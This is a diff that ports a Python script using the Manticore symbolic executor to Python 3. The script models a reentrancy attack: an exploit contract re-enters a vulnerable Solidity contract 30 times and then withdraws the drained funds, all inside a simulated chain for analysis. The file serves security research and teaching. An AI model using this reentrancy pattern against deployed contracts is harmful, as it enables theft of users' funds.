@@ -1,10 +1,11 @@
 from manticore.ethereum import ManticoreEVM
+
 ################ Script #######################
 
 m = ManticoreEVM()
 m.verbosity(0)
-#The contract account to analyze
-contract_source_code = '''
+# The contract account to analyze
+contract_source_code = """
 pragma solidity ^0.4.15;
 
 contract Reentrance {
@@ -27,9 +28,9 @@ contract Reentrance {
         userBalance[msg.sender] = 0;
     }   
 }
-'''
+"""
 
-exploit_source_code = '''
+exploit_source_code = """
 pragma solidity ^0.4.15;
 
 contract GenericReentranceExploit {
@@ -72,49 +73,55 @@ contract GenericReentranceExploit {
         }
     }
 }
-'''
+"""
 
 
-#Initialize user and contracts
+# Initialize user and contracts
 user_account = m.create_account(balance=100000000000000000)
 attacker_account = m.create_account(balance=100000000000000000)
-contract_account = m.solidity_create_contract(contract_source_code, owner=user_account) #Not payable
+contract_account = m.solidity_create_contract(
+    contract_source_code, owner=user_account
+)  # Not payable
 exploit_account = m.solidity_create_contract(exploit_source_code, owner=attacker_account)
 
 
-#User deposits all in contract
-print "[+] user deposited some."
+# User deposits all in contract
+print("[+] user deposited some.")
 contract_account.addToBalance(value=100000000000000000)
 
-print "[+] Initial world state"
-print "     attacker_account %x balance: %d"% (attacker_account, m.get_balance(attacker_account))
-print "     exploit_account %x balance: %d"%  (exploit_account, m.get_balance(exploit_account))
-print "     user_account %x balance: %d"%  (user_account, m.get_balance(user_account))
-print "     contract_account %x balance: %d"%  (contract_account, m.get_balance(contract_account))
+print("[+] Initial world state")
+print(
+    f"     attacker_account {attacker_account.address:x} balance: {m.get_balance(attacker_account.address)}"
+)
+print(
+    f"     exploit_account {exploit_account.address:x} balance: {m.get_balance(exploit_account.address)}"
+)
+print(f"     user_account {user_account.address:x} balance: {m.get_balance(user_account.address)}")
+print(
+    f"     contract_account {contract_account.address} balance: {m.get_balance(contract_account.address)}"
+)
 
 
-
-print "[+] Setup the exploit"
+print("[+] Set up the exploit")
 exploit_account.set_vulnerable_contract(contract_account)
 
-print "\t Setting 30 reply reps"
+print("\t Setting 30 reply reps")
 exploit_account.set_reentry_reps(30)
 
-print "\t Setting reply string"
-exploit_account.set_reentry_attack_string(m.SByte(4))
+print("\t Setting reply string")
+exploit_account.set_reentry_attack_string(m.make_symbolic_buffer(4))
 
-#Attacker is
-print "[+] Attacker first transaction"
-exploit_account.proxycall(m.SByte(4), value=m.SValue)
+# Attacker is
+print("[+] Attacker first transaction")
+exploit_account.proxycall(m.make_symbolic_buffer(4), value=m.make_symbolic_value())
 
-print "[+] Attacker second transaction" 
-exploit_account.proxycall(m.SByte(4))
+print("[+] Attacker second transaction")
+exploit_account.proxycall(m.make_symbolic_buffer(4))
 
-print "[+] The attacker destroys the exploit contract and profit" 
+print("[+] The attacker destroys the exploit contract and profit")
 exploit_account.get_money()
 
-#Let seth know we are not sending more transactions so it can output 
+# Let seth know we are not sending more transactions so it can output
 # info about running states and global statistics
 m.finalize()
-print "[+] Look for results in %s"% m.workspace
-
+print(f"[+] Look for results in {m.workspace}")
